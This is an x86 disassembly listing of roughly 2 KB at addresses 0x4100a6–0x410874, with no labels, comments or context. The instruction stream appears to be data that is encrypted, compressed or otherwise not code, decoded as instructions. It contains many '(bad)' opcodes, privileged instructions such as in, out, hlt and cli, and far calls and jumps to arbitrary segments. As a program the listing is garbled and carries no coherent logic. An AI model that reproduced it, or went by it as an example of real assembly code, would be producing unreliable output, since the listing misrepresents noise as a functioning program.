  4100a6:	iret   
  4100a7:	pop    esi
  4100a8:	in     eax,0x76
  4100aa:	adc    eax,0x76cb70a4
  4100af:	add    BYTE PTR [edi-0x78],al
  4100b2:	adc    al,0x3e
  4100b4:	xchg   ebp,eax
  4100b5:	(bad)  
  4100b7:	or     ebx,DWORD PTR [ebx*8+0x3b74d556]
  4100be:	stos   DWORD PTR es:[edi],eax
  4100bf:	arpl   WORD PTR [esi-0x18d7bfa9],cx
  4100c5:	rcl    edx,cl
  4100c7:	cmc    
  4100c8:	push   0xbfda8a3e
  4100cd:	loopne 0x410068
  4100cf:	jg     0x410102
  4100d1:	inc    esp
  4100d2:	pop    eax
  4100d3:	push   es
  4100d4:	(bad)  
  4100d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100d6:	sbb    bl,BYTE PTR [edi+0x79c0118b]
  4100dc:	jb     0x4100fd
  4100de:	add    DWORD PTR [edx],edx
  4100e0:	adc    al,dl
  4100e2:	in     eax,dx
  4100e3:	add    BYTE PTR [edi+0x3d3f61],cl
  4100e9:	in     eax,dx
  4100ea:	stos   BYTE PTR es:[edi],al
  4100eb:	jns    0x4100b7
  4100ed:	lahf   
  4100ee:	push   cs
  4100ef:	pop    ebx
  4100f0:	and    ecx,esi
  4100f2:	les    esi,FWORD PTR [ebp+0x447e8a8]
  4100f8:	and    DWORD PTR [eax-0x2ab1ffdf],esp
  4100fe:	adc    bh,BYTE PTR ds:0x22cbaf23
  410104:	outs   dx,BYTE PTR ds:[esi]
  410105:	dec    eax
  410106:	ror    DWORD PTR ds:0x37a34ba6,1
  41010c:	loope  0x4100dc
  41010e:	adc    cl,cl
  410110:	push   ss
  410111:	xchg   ebx,eax
  410112:	imul   edx,ebp,0xd913a84c
  410118:	pop    ebx
  410119:	pop    ecx
  41011a:	sbb    BYTE PTR [edx],ah
  41011c:	sub    dh,BYTE PTR ds:[edx-0x237724bd]
  410123:	out    0x99,al
  410125:	jmp    0x410141
  410127:	rcl    DWORD PTR [ebp+0x7d],0x43
  41012b:	bnd jge 0x41018a
  41012e:	mov    WORD PTR [edi+0x7b],?
  410131:	xor    al,0x83
  410133:	iret   
  410134:	xlat   BYTE PTR ds:[ebx]
  410135:	jo     0x410137
  410137:	mov    ds:0xbaf31192,eax
  41013c:	sahf   
  41013d:	mov    esi,DWORD PTR [eax+0x76a3ce52]
  410143:	cmc    
  410144:	test   eax,0x8ded5561
  410149:	jp     0x410158
  41014b:	mov    esp,0x704b57f7
  410150:	mov    eax,0x50680148
  410155:	mov    al,0xd5
  410157:	or     cl,ah
  410159:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41015a:	out    dx,al
  41015b:	jmp    0x1986:0x323250ba
  410162:	loopne 0x41018e
  410164:	pushf  
  410165:	adc    DWORD PTR [edi-0x23b45969],edi
  41016b:	mov    esp,0x1b67cd98
  410170:	push   0xf33020a1
  410175:	adc    edx,DWORD PTR [esi]
  410177:	sbb    al,0x56
  410179:	ret    
  41017a:	ss pop esi
  41017c:	jbe    0x41019e
  41017e:	mov    edi,0x4e59ac26
  410183:	mov    edi,0x229eff7
  410188:	fcom   QWORD PTR [ebx-0x41]
  41018b:	loope  0x4101a6
  41018d:	jae    0x4101f2
  41018f:	pop    es
  410190:	stc    
  410191:	sahf   
  410192:	dec    ebx
  410193:	and    eax,0xe4a2af16
  410198:	inc    ecx
  410199:	xchg   edx,eax
  41019a:	jne    0x410163
  41019c:	test   BYTE PTR [ebx],bl
  41019e:	push   esp
  41019f:	mov    ebp,0xa637c4c8
  4101a4:	aaa    
  4101a5:	mov    edi,0x83bb0cb6
  4101aa:	pop    edx
  4101ab:	cli    
  4101ac:	jno    0x410170
  4101ae:	sub    eax,0x80bd1ecc
  4101b3:	mov    ebx,0x5b0446ef
  4101b8:	pusha  
  4101b9:	lods   eax,DWORD PTR ds:[esi]
  4101ba:	push   edx
  4101bb:	mov    bh,0xfe
  4101bd:	pop    ecx
  4101be:	aam    0xed
  4101c0:	adc    bl,BYTE PTR ds:0x867dc466
  4101c6:	add    eax,0x48ac2584
  4101cb:	fisub  WORD PTR [ebx]
  4101cd:	push   0xffffff88
  4101cf:	call   0xc868:0x83801468
  4101d6:	int3   
  4101d7:	or     DWORD PTR [esp+edx*1+0x11db3366],ebx
  4101de:	loop   0x410201
  4101e0:	cmp    al,0xfe
  4101e2:	cwde   
  4101e3:	jo     0x410219
  4101e5:	push   edi
  4101e6:	pop    ds
  4101e7:	cs push 0xc8151e0b
  4101ed:	in     al,0x17
  4101ef:	cdq    
  4101f0:	xor    al,0x52
  4101f2:	bound  ecx,QWORD PTR [ecx-0x42]
  4101f5:	dec    ebp
  4101f6:	jb     0x410270
  4101f8:	pop    ss
  4101f9:	or     ecx,DWORD PTR [ebx-0x7a472f47]
  4101ff:	in     al,0x26
  410201:	xor    al,BYTE PTR [ecx]
  410203:	mov    edx,0x9c792991
  410208:	and    ch,dh
  41020a:	icebp  
  41020b:	fwait
  41020c:	xchg   esp,eax
  41020d:	xor    BYTE PTR [ebp+0x1636682c],bh
  410213:	cmc    
  410214:	nop
  410215:	mov    ah,0x7d
  410217:	push   cs
  410218:	mov    bl,0xc7
  41021a:	nop
  41021b:	xchg   ebx,eax
  41021c:	das    
  41021d:	fs pop ss
  41021f:	adc    ebp,DWORD PTR [edx]
  410221:	or     al,0xa0
  410223:	fldcw  WORD PTR [edx]
  410225:	cmp    BYTE PTR [edi+edi*4-0xe4a08b8],bh
  41022c:	push   ds
  41022d:	push   ss
  41022e:	fs lahf 
  410230:	call   0x4eb5:0x7b00082d
  410237:	sbb    al,0x5f
  410239:	aaa    
  41023a:	les    eax,FWORD PTR [eax+esi*4]
  41023d:	or     esp,ecx
  41023f:	sahf   
  410240:	adc    BYTE PTR [eax-0x55a4a5bf],ah
  410246:	xor    al,0x9a
  410248:	xchg   BYTE PTR [edx],dl
  41024a:	jge    0x410222
  41024c:	xchg   ebp,eax
  41024d:	mov    DWORD PTR [esi-0x4e],ebx
  410250:	inc    ecx
  410251:	ins    BYTE PTR es:[edi],dx
  410252:	hlt    
  410253:	push   es
  410254:	scas   al,BYTE PTR es:[edi]
  410255:	mov    esp,eax
  410257:	iret   
  410258:	hlt    
  410259:	xor    al,0x15
  41025b:	ins    DWORD PTR es:[edi],dx
  41025c:	and    ah,BYTE PTR [ebx+ebp*2+0x70]
  410260:	jne    0x41027c
  410262:	inc    ecx
  410263:	(bad)  
  410264:	cld    
  410265:	mov    cl,0x6b
  410267:	or     DWORD PTR [ecx+0x38],ecx
  41026a:	mov    WORD PTR ds:0x92490592,ds
  410270:	test   DWORD PTR [edx],esp
  410272:	jne    0x4102ab
  410274:	lea    edi,[ebp+0x6c413e37]
  41027a:	mov    ebx,DWORD PTR [ecx-0x80]
  41027d:	fnsave [ecx-0x70531240]
  410283:	sub    edi,DWORD PTR [ebp-0x3393c7e4]
  410289:	gs pop ebx
  41028b:	retf   0xacdb
  41028e:	(bad)  
  41028f:	xlat   BYTE PTR ds:[ebx]
  410290:	imul   ebp,DWORD PTR [edx],0xf6fe11b
  410296:	popf   
  410297:	pop    esp
  410298:	inc    esi
  410299:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41029a:	push   0x5f
  41029c:	cmp    ecx,DWORD PTR [ecx+0x71]
  41029f:	inc    esi
  4102a0:	dec    esi
  4102a1:	pop    edi
  4102a2:	gs jge 0x41025c
  4102a5:	xlat   BYTE PTR ds:[ebx]
  4102a6:	inc    ecx
  4102a7:	std    
  4102a8:	jmp    0x20302470
  4102ad:	repnz aas 
  4102af:	lods   eax,DWORD PTR ds:[esi]
  4102b0:	in     eax,dx
  4102b1:	daa    
  4102b2:	inc    esi
  4102b3:	fcomi  st,st(7)
  4102b5:	loopne 0x41026f
  4102b7:	mov    al,0x81
  4102b9:	jge    0x41033a
  4102bb:	push   0x62
  4102bd:	mov    edi,0x66654767
  4102c2:	out    0xb0,al
  4102c4:	(bad)  
  4102c5:	xchg   edi,eax
  4102c6:	mov    edi,0xb5b6dab9
  4102cb:	push   esp
  4102cc:	data16 ss cmp ah,ch
  4102d0:	and    al,BYTE PTR [eax]
  4102d2:	xchg   esi,eax
  4102d3:	adc    eax,0xff12c0d2
  4102d8:	add    esi,DWORD PTR [ecx]
  4102da:	scas   al,BYTE PTR es:[edi]
  4102db:	clc    
  4102dc:	pop    ebp
  4102dd:	scas   al,BYTE PTR es:[edi]
  4102de:	adc    DWORD PTR [ecx+0x70c69371],esi
  4102e4:	push   ecx
  4102e5:	mov    ebp,DWORD PTR [ebx-0x3b7518f5]
  4102eb:	test   esi,edx
  4102ed:	push   ecx
  4102ee:	sti    
  4102ef:	dec    edx
  4102f0:	jle    0x410351
  4102f2:	mov    dl,0x64
  4102f4:	(bad)  
  4102f6:	sbb    ah,al
  4102f8:	sbb    BYTE PTR [edx+0x67],ch
  4102fb:	arpl   WORD PTR [edi-0x3b],ax
  4102fe:	push   ss
  4102ff:	ret    0x848f
  410302:	rcr    DWORD PTR [edi],0x43
  410305:	imul   BYTE PTR [eax+edi*2+0x68]
  410309:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41030a:	push   eax
  41030b:	and    eax,0xe67b651f
  410310:	jge    0x4102fd
  410312:	pop    ecx
  410313:	inc    esi
  410314:	sub    al,0xbe
  410316:	dec    edi
  410317:	cmc    
  410318:	and    BYTE PTR ds:0xad100a2f,dh
  41031e:	inc    ecx
  41031f:	out    0xc9,eax
  410321:	popa   
  410322:	inc    ebp
  410323:	and    ah,bl
  410325:	pusha  
  410326:	sbb    dl,BYTE PTR [esi]
  410328:	mov    ch,0x81
  41032a:	jl     0x4102dd
  41032c:	mov    bh,0x42
  41032e:	cmp    DWORD PTR [eax+0x279d9cb6],ebp
  410334:	je     0x4102f4
  410336:	in     eax,dx
  410337:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410338:	call   0xd54df5e9
  41033d:	xlat   BYTE PTR ds:[ebx]
  41033e:	daa    
  41033f:	dec    ecx
  410340:	jbe    0x41034d
  410342:	call   0x2e1eec78
  410347:	rcr    BYTE PTR [ecx-0x7e5a4c14],1
  41034d:	pop    esi
  41034e:	pop    edi
  41034f:	shl    BYTE PTR [esi+0x1557552f],1
  410355:	and    al,0x16
  410357:	mov    ds:0x44c86d23,eax
  41035c:	daa    
  41035d:	xor    DWORD PTR [edi-0x2ec6bcb1],ecx
  410363:	pop    DWORD PTR [ebx-0x53742664]
  410369:	jae    0x410306
  41036b:	and    BYTE PTR [ecx],cl
  41036d:	aad    0x86
  41036f:	ficomp WORD PTR [esi]
  410371:	scas   al,BYTE PTR es:[edi]
  410372:	inc    ebx
  410373:	fst    DWORD PTR [edi-0x1f]
  410376:	pop    edx
  410377:	retf   0x2836
  41037a:	mov    ecx,0x89345f6f
  41037f:	idiv   al
  410381:	pusha  
  410382:	and    ecx,edx
  410384:	hlt    
  410385:	stos   DWORD PTR es:[edi],eax
  410386:	stos   BYTE PTR es:[edi],al
  410387:	pop    ebx
  410388:	and    BYTE PTR [esi],ah
  41038a:	aas    
  41038b:	(bad)  [ecx-0x7a]
  41038e:	xor    cl,bh
  410390:	and    al,0x75
  410392:	stc    
  410393:	dec    ecx
  410394:	xor    edx,DWORD PTR [ebp-0x31]
  410397:	sub    BYTE PTR [eax],dl
  410399:	stos   BYTE PTR es:[edi],al
  41039a:	jbe    0x4103c1
  41039c:	out    0x43,al
  41039e:	outs   dx,BYTE PTR ds:[esi]
  41039f:	cmp    al,0xcc
  4103a1:	or     al,0x23
  4103a3:	loopne 0x410362
  4103a5:	sbb    al,0x9b
  4103a7:	(bad)  
  4103a8:	test   BYTE PTR [ecx-0x559c72b0],0x1a
  4103af:	pusha  
  4103b0:	cmp    al,0x9d
  4103b2:	sbb    edi,DWORD PTR [eax+0x1b]
  4103b5:	push   ecx
  4103b6:	or     eax,0x51e3c9c3
  4103bb:	pop    es
  4103bc:	inc    ebp
  4103bd:	inc    edi
  4103be:	mov    cl,0x25
  4103c0:	sub    DWORD PTR [edi],0x54
  4103c3:	shr    eax,1
  4103c5:	test   BYTE PTR [edx-0x23],dh
  4103c8:	xor    al,0xe8
  4103ca:	and    DWORD PTR [esi-0x6e591197],ebp
  4103d0:	jecxz  0x410390
  4103d2:	dec    edx
  4103d3:	push   0x6040263d
  4103d8:	pop    esp
  4103d9:	mov    dl,0x8b
  4103db:	gs add al,0x75
  4103de:	mov    WORD PTR [ebp+0x60],?
  4103e1:	popf   
  4103e2:	cld    
  4103e3:	sbb    bh,BYTE PTR [eax+0x4cb3942e]
  4103e9:	jp     0x410420
  4103eb:	cmp    DWORD PTR [ebx+0x76c5a585],ebp
  4103f1:	stos   BYTE PTR es:[edi],al
  4103f2:	stc    
  4103f3:	mov    esp,0x8ceb9da2
  4103f8:	aad    0x43
  4103fa:	neg    BYTE PTR [ebx+0x1711c78e]
  410400:	xlat   BYTE PTR ds:[ebx]
  410401:	stos   BYTE PTR es:[edi],al
  410402:	pop    edx
  410403:	mov    edi,0x7332d252
  410408:	das    
  410409:	test   BYTE PTR [ebx+0x13e28035],bh
  41040f:	(bad)  
  410410:	cs cdq 
  410412:	xor    DWORD PTR [esi-0x4],ebp
  410415:	and    eax,0xbfa9a45b
  41041a:	sub    al,0x9a
  41041c:	xor    ch,BYTE PTR [edx-0x50c09791]
  410422:	inc    edi
  410423:	mov    esp,0xa004e59f
  410428:	and    esi,DWORD PTR [eax]
  41042a:	mov    cl,0xe6
  41042c:	adc    ebp,DWORD PTR [ecx]
  41042e:	je     0x41043e
  410430:	pop    ds
  410431:	inc    si
  410433:	(bad)  
  410434:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  410436:	xchg   ebx,eax
  410437:	dec    ebp
  410438:	xor    esi,DWORD PTR [eax+0x34]
  41043b:	fadd   DWORD PTR [esi]
  41043d:	stc    
  41043e:	sub    ah,BYTE PTR [esi+edx*1-0x71]
  410442:	push   ecx
  410443:	dec    ebx
  410444:	inc    ebp
  410445:	fstp   TBYTE PTR [edi]
  410447:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410448:	jg     0x410487
  41044a:	leave  
  41044b:	push   ds
  41044c:	inc    esp
  41044d:	out    dx,eax
  41044e:	daa    
  41044f:	icebp  
  410450:	inc    esi
  410451:	ja     0x41046e
  410453:	and    BYTE PTR [esi-0x5e],0xc1
  410457:	ret    
  410458:	push   ecx
  410459:	dec    ebx
  41045a:	pop    esp
  41045b:	pop    ss
  41045c:	jge    0x4103f5
  41045e:	sbb    eax,esi
  410460:	xor    edi,ebp
  410462:	test   ebx,edx
  410464:	xchg   ecx,eax
  410465:	or     DWORD PTR [eax-0x63],edx
  410468:	inc    esp
  410469:	ins    DWORD PTR es:[edi],dx
  41046a:	mov    bh,0x7d
  41046c:	daa    
  41046d:	adc    ebx,DWORD PTR [eax+0x57130ab1]
  410473:	sbb    dl,bl
  410475:	fisttp QWORD PTR [ebx-0x78]
  410478:	mov    ebp,0x9bd0561
  41047d:	ror    DWORD PTR [edx],1
  41047f:	jl     0x410498
  410481:	jo     0x4104f0
  410483:	sar    BYTE PTR [ecx+0x79d073d7],0x70
  41048a:	stos   DWORD PTR es:[edi],eax
  41048b:	cmp    al,0x9e
  41048d:	xor    bh,bh
  41048f:	pop    eax
  410490:	or     BYTE PTR [edi+0x6e],dl
  410493:	jmp    0xe08ff7b2
  410498:	jb     0x4104df
  41049a:	ffree  st(3)
  41049c:	cmc    
  41049d:	sub    bh,BYTE PTR [ecx+0x483551d8]
  4104a3:	pop    ebx
  4104a4:	push   esi
  4104a5:	mov    bh,0xb5
  4104a7:	scas   eax,DWORD PTR es:[edi]
  4104a8:	jmp    0x5dcee9c7
  4104ad:	div    BYTE PTR [ecx+0x4b2990dd]
  4104b3:	add    ch,cl
  4104b5:	inc    ebp
  4104b6:	inc    esp
  4104b7:	ja     0x410518
  4104b9:	pop    esp
  4104ba:	shl    DWORD PTR [ebx],cl
  4104bc:	jge    0x4104c4
  4104be:	inc    eax
  4104bf:	clc    
  4104c0:	call   0xc290:0x416c81af
  4104c7:	xor    eax,0xa3b4d66b
  4104cc:	and    edx,DWORD PTR [ebp-0xf]
  4104cf:	call   0xca4c:0x546b06cf
  4104d6:	ret    
  4104d7:	push   cs
  4104d8:	sar    bl,cl
  4104da:	cmp    al,0xf9
  4104dc:	push   edx
  4104dd:	enter  0xbb05,0xfa
  4104e1:	and    cl,BYTE PTR [esi+0x4b]
  4104e4:	sub    eax,0x955b1570
  4104e9:	xchg   ecx,eax
  4104ea:	clc    
  4104eb:	das    
  4104ec:	fdiv   QWORD PTR [eax+0x11]
  4104ef:	mov    dl,0xb3
  4104f1:	push   ebp
  4104f2:	fmul   QWORD PTR [edx+edx*8+0x33b83fb1]
  4104f9:	in     al,dx
  4104fa:	mov    ecx,0x29440957
  4104ff:	xchg   ecx,eax
  410500:	sbb    dh,BYTE PTR [ecx]
  410502:	jmp    0xc667:0xb83c76cd
  410509:	xor    esp,DWORD PTR [edx]
  41050b:	sub    ecx,DWORD PTR [edi]
  41050d:	xchg   eax,edi
  41050f:	cmp    al,0x1
  410511:	jb     0x4104d8
  410513:	dec    esi
  410514:	out    dx,al
  410515:	xor    al,0x40
  410517:	adc    DWORD PTR [esi-0x79],0x26
  41051b:	cmp    edi,0x364c7f8
  410521:	sbb    DWORD PTR [esi],eax
  410523:	mov    eax,ds:0x73d7a390
  410528:	or     al,0xa1
  41052a:	mul    DWORD PTR [esi+0x58b73e2f]
  410530:	fst    DWORD PTR [edx+0xcd86f90]
  410536:	popf   
  410537:	repnz xor bl,BYTE PTR [ebp+0xb69eb3b]
  41053e:	pop    ss
  41053f:	cmp    BYTE PTR ds:0xfb6d0062,al
  410545:	out    0xbe,eax
  410547:	pop    es
  410548:	aaa    
  410549:	shl    DWORD PTR [ecx+eiz*1],0x1e
  41054d:	mov    dl,0x8
  41054f:	loope  0x410588
  410551:	jb     0x41051e
  410553:	call   0x21ca07e2
  410558:	repnz (bad) 
  41055a:	cs cdq 
  41055c:	repz lock ror DWORD PTR [ebx-0x56],0x9
  410562:	adc    al,0x80
  410564:	pop    DWORD PTR [ebx+0x299273d1]
  41056a:	or     DWORD PTR [edi-0x7f],edi
  41056d:	dec    esi
  41056e:	push   eax
  41056f:	inc    ebp
  410570:	pushf  
  410571:	pop    es
  410572:	sahf   
  410573:	into   
  410574:	test   eax,0xa8682e9d
  410579:	test   BYTE PTR [edx-0x15],0x1e
  41057d:	cwde   
  41057e:	ins    BYTE PTR es:[edi],dx
  41057f:	pop    esi
  410580:	xor    DWORD PTR [ecx-0x28d1bdc5],esp
  410586:	shl    BYTE PTR [esp+edi*1-0x52],1
  41058a:	mov    edi,0x248747d1
  41058f:	cmp    edx,DWORD PTR fs:[edi-0x71]
  410593:	je     0x410540
  410595:	(bad)  
  410596:	jo     0x4105ad
  410598:	sub    DWORD PTR [edi+0x10],ecx
  41059b:	xchg   edi,eax
  41059c:	xchg   esi,eax
  41059d:	push   ebx
  41059e:	sbb    DWORD PTR [esi-0x6858ba1e],ebp
  4105a4:	enter  0x1e4a,0x37
  4105a8:	cmp    eax,0x4bc535e3
  4105ad:	xchg   ebx,eax
  4105ae:	pop    esp
  4105af:	dec    eax
  4105b0:	cli    
  4105b1:	push   ebx
  4105b2:	inc    esp
  4105b3:	fs cmp eax,0x1919bc1d
  4105b9:	cli    
  4105ba:	mov    al,0xf9
  4105bc:	hlt    
  4105bd:	stos   DWORD PTR es:[edi],eax
  4105be:	call   0xc9fe:0xeecec35c
  4105c5:	pop    edx
  4105c6:	fs xchg ebp,eax
  4105c8:	leave  
  4105c9:	adc    al,0xc6
  4105cb:	adc    ah,BYTE PTR [ebp+0x1cda094a]
  4105d1:	and    DWORD PTR [edi-0x69],esp
  4105d4:	pushf  
  4105d5:	ret    
  4105d6:	rcl    DWORD PTR [ebp+0x78],cl
  4105d9:	or     al,0xe8
  4105db:	(bad)  
  4105dc:	iret   
  4105dd:	(bad)  es:[ecx+ebp*4]
  4105e1:	xchg   ebp,eax
  4105e2:	xchg   edx,eax
  4105e3:	cmp    al,0x99
  4105e5:	mov    ch,0x0
  4105e7:	icebp  
  4105e8:	xchg   BYTE PTR [eax],al
  4105ea:	mov    esp,0xae4022ef
  4105ef:	mov    dh,0xd
  4105f1:	int3   
  4105f2:	ins    BYTE PTR es:[edi],dx
  4105f3:	fsub   DWORD PTR [edi]
  4105f5:	push   ecx
  4105f6:	adc    DWORD PTR [ebp+0x3b5b264e],eax
  4105fc:	xchg   ecx,eax
  4105fd:	pop    edi
  4105fe:	and    al,dl
  410600:	xor    al,0xb6
  410602:	popf   
  410603:	mov    eax,0xf4ba4d7d
  410608:	xchg   BYTE PTR [edi],bh
  41060a:	and    DWORD PTR [ecx],esi
  41060c:	lods   al,BYTE PTR ds:[esi]
  41060d:	jne    0x410660
  41060f:	adc    eax,0x74e6f677
  410614:	sbb    BYTE PTR [ecx-0x77],cl
  410617:	out    dx,eax
  410618:	adc    BYTE PTR [esi],dl
  41061a:	data16 mov fs,WORD PTR [eax-0x27]
  41061e:	adc    ebx,eax
  410620:	sbb    esi,DWORD PTR [ebx]
  410622:	cli    
  410623:	in     al,dx
  410624:	ja     0x41066a
  410626:	data16 das 
  410628:	mov    esp,0x9ee7f28a
  41062d:	push   ecx
  41062e:	pushf  
  41062f:	dec    ebx
  410630:	jge    0x4106a6
  410632:	cs (bad) 
  410634:	xchg   edx,eax
  410635:	bound  esi,QWORD PTR [eax+ebp*2+0x2b908f0c]
  41063c:	mov    ebp,0x926566a3
  410641:	xchg   esp,eax
  410642:	add    ah,BYTE PTR [esi+0x691821d2]
  410648:	push   ecx
  410649:	inc    ebx
  41064a:	dec    esi
  41064b:	pop    ss
  41064c:	test   eax,0xd13ee12b
  410651:	inc    esp
  410652:	es sub ebp,edi
  410655:	pop    ebx
  410656:	push   esi
  410657:	and    edx,DWORD PTR [ebx-0xd98d1bd]
  41065d:	test   al,0x4c
  41065f:	xor    esp,eax
  410661:	xchg   edx,eax
  410662:	or     esi,esp
  410664:	(bad)  
  410665:	out    dx,eax
  410666:	and    bl,BYTE PTR [ebx]
  410668:	push   ebp
  410669:	push   esi
  41066a:	mov    esi,ebx
  41066c:	inc    ebx
  41066d:	adc    eax,0xb04a659a
  410672:	leave  
  410673:	cmp    edi,esp
  410675:	sub    edi,esi
  410677:	icebp  
  410678:	add    al,0xd0
  41067a:	cmc    
  41067b:	out    0x7d,al
  41067d:	mov    BYTE PTR [bp+si+0x13],dh
  410681:	std    
  410682:	cli    
  410683:	fst    QWORD PTR [ebx-0x54]
  410686:	or     eax,ebp
  410688:	loope  0x4106fb
  41068a:	fimul  WORD PTR [ecx-0x62ff7a97]
  410690:	pop    esi
  410691:	pop    esi
  410692:	or     al,0x8
  410694:	push   ebx
  410695:	add    edx,DWORD PTR [esp+eiz*4-0x7899584b]
  41069c:	cmp    edx,DWORD PTR [edi+0x2737a42d]
  4106a2:	popa   
  4106a3:	dec    eax
  4106a4:	jecxz  0x410691
  4106a6:	mov    ah,0x1f
  4106a8:	test   DWORD PTR [ebx+0x42],esp
  4106ab:	jecxz  0x41072c
  4106ad:	fcom   DWORD PTR [ecx-0x6b]
  4106b0:	dec    ebp
  4106b1:	mov    ecx,DWORD PTR [edx+0x3d]
  4106b4:	sti    
  4106b5:	mov    ah,0x1e
  4106b7:	xchg   esi,eax
  4106b8:	(bad)  
  4106b9:	or     edi,esp
  4106bb:	xchg   ebx,eax
  4106bc:	jmp    0x4106f7
  4106be:	mov    ebp,0x7339a975
  4106c3:	pushf  
  4106c4:	cs xor eax,0xd202136d
  4106ca:	(bad)  
  4106cb:	aam    0xa6
  4106cd:	jbe    0x41066e
  4106cf:	jnp    0x4106c6
  4106d1:	push   esp
  4106d2:	sti    
  4106d3:	sub    ebp,ecx
  4106d5:	dec    ebp
  4106d6:	daa    
  4106d7:	cdq    
  4106d8:	add    ecx,esp
  4106da:	int3   
  4106db:	dec    ebx
  4106dc:	out    0xe6,eax
  4106de:	loopne 0x4106f1
  4106e0:	adc    esi,esi
  4106e2:	imul   esp,DWORD PTR [esi-0xc],0x79
  4106e6:	pop    ecx
  4106e7:	out    0x40,al
  4106e9:	repz shr ecx,cl
  4106ec:	push   0x1d
  4106ee:	call   0x4f099f4e
  4106f3:	push   0x1c30ca3c
  4106f8:	dec    esi
  4106f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106fa:	and    edi,ebx
  4106fc:	rcr    DWORD PTR [ebx+ebx*1-0x6f],1
  410700:	pop    ebx
  410701:	mov    BYTE PTR [edi-0x5e4b899d],al
  410707:	rcr    DWORD PTR [ebx-0x3cfd2b6d],1
  41070d:	add    al,0xb3
  41070f:	jno    0x410774
  410711:	mov    edi,0x1eb53c23
  410716:	sub    bl,BYTE PTR [ebx]
  410718:	bound  ecx,QWORD PTR [ebx-0x69efaf87]
  41071e:	xor    bh,BYTE PTR ds:0xf00a043d
  410724:	rcl    DWORD PTR [esi-0x64],0xbb
  410728:	mov    ds:0x13b48755,al
  41072d:	xor    ecx,DWORD PTR [esi]
  41072f:	adc    eax,0x5b35d20a
  410734:	fiadd  WORD PTR [ebp+0x7b]
  410737:	cmp    esp,DWORD PTR ds:0xe80f9c55
  41073d:	rcr    BYTE PTR [ebp-0x7a0168aa],cl
  410743:	not    BYTE PTR [ecx]
  410745:	bound  ebx,QWORD PTR [esi-0x1da5927a]
  41074b:	dec    esi
  41074c:	aad    0x3a
  41074e:	inc    ebx
  41074f:	and    al,0x42
  410751:	or     edx,DWORD PTR [edi]
  410753:	test   eax,0xe32a31a5
  410758:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410759:	mov    edi,DWORD PTR [ecx+0x36]
  41075c:	shl    DWORD PTR [edi-0x6666b017],cl
  410762:	dec    esi
  410763:	fisttp DWORD PTR [edx+ebx*2+0x15]
  410767:	jmp    0x8c50:0x723d6617
  41076e:	mov    edx,0x7f950746
  410773:	push   esi
  410774:	in     al,0xaf
  410776:	inc    edi
  410777:	jp     0x410716
  410779:	int    0x55
  41077b:	jecxz  0x410743
  41077d:	call   0x1ff1:0x8b453494
  410784:	dec    esi
  410785:	push   0xb37fa483
  41078a:	xchg   ebp,eax
  41078b:	nop
  41078c:	pop    ecx
  41078d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41078e:	fnstsw WORD PTR [ebp-0x78]
  410791:	stos   BYTE PTR es:[edi],al
  410792:	add    DWORD PTR [ebx+0x4f],esi
  410795:	adc    ebp,DWORD PTR [esi]
  410797:	mov    dl,0xc
  410799:	daa    
  41079a:	pop    ss
  41079b:	and    DWORD PTR [ebx+0x37c10ba1],0x3d
  4107a2:	je     0x410821
  4107a4:	add    cl,dl
  4107a6:	out    0xf2,al
  4107a8:	stos   BYTE PTR es:[edi],al
  4107a9:	mov    edi,0x62158fe5
  4107ae:	popf   
  4107af:	mov    bh,dh
  4107b1:	out    dx,al
  4107b2:	jno    0x4107a5
  4107b4:	call   0xb42afcf6
  4107b9:	outs   dx,DWORD PTR ds:[esi]
  4107ba:	ds mov edx,0x161dab61
  4107c0:	mov    al,0x40
  4107c2:	gs into 
  4107c4:	or     BYTE PTR [ecx+0x2765128a],0x7e
  4107cb:	lds    eax,FWORD PTR [ecx+ecx*1-0x55]
  4107cf:	(bad)  
  4107d0:	or     eax,0xef4c2e03
  4107d5:	and    eax,0xcb65fac2
  4107da:	sbb    DWORD PTR [edx],ebx
  4107dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107dd:	mov    dl,0x1c
  4107df:	(bad)  
  4107e1:	or     ebp,DWORD PTR [ebx+0x28]
  4107e4:	xor    al,0x80
  4107e6:	mov    ah,0xd4
  4107e8:	cmp    edi,esp
  4107ea:	mov    esp,DWORD PTR [ecx-0x204823ff]
  4107f0:	xor    BYTE PTR [edx-0x361cfeee],ah
  4107f6:	ins    BYTE PTR es:[edi],dx
  4107f7:	and    BYTE PTR [edi-0x4d],dl
  4107fa:	push   ebx
  4107fb:	js     0x41081c
  4107fd:	stos   DWORD PTR es:[edi],eax
  4107fe:	mov    DWORD PTR [eax],edx
  410800:	and    BYTE PTR [ebp-0x80],ah
  410803:	call   0x2360:0x1d967e4e
  41080a:	(bad)  
  41080b:	iret   
  41080c:	shl    DWORD PTR [edi-0x7de47abe],cl
  410812:	jle    0x410842
  410814:	mov    dh,0x4c
  410816:	outs   dx,BYTE PTR ds:[esi]
  410817:	push   0x58687db1
  41081c:	xchg   esi,eax
  41081d:	mov    ecx,0x807e16a2
  410822:	cmp    BYTE PTR [eax+0x55aee6af],0x15
  410829:	cmp    bh,ah
  41082b:	mov    edx,0x4094142e
  410830:	daa    
  410831:	pop    ecx
  410832:	fs (bad) 
  410835:	add    ch,bh
  410837:	xor    cl,dh
  410839:	jmp    ebx
  41083b:	xchg   ebp,eax
  41083c:	mov    ebx,0x87d9375f
  410841:	and    DWORD PTR [ecx-0x136b871d],ebp
  410847:	bound  edi,QWORD PTR [esi-0x11a57b31]
  41084d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41084e:	dec    eax
  41084f:	inc    ebx
  410850:	ins    DWORD PTR es:[edi],dx
  410851:	enter  0x9163,0x22
  410855:	dec    edx
  410856:	and    BYTE PTR [ebp+0x3ce519af],bh
  41085c:	sub    cl,0xb7
  41085f:	inc    ebx
  410860:	ins    DWORD PTR es:[edi],dx
  410861:	inc    ecx
  410862:	xchg   ecx,eax
  410863:	jae    0x410895
  410865:	adc    eax,0x53f266cb
  41086a:	imul   eax,esp,0xd3137256
  410870:	or     cl,bh
  410872:	mov    ch,0xaf
  410874:	dec    ebp
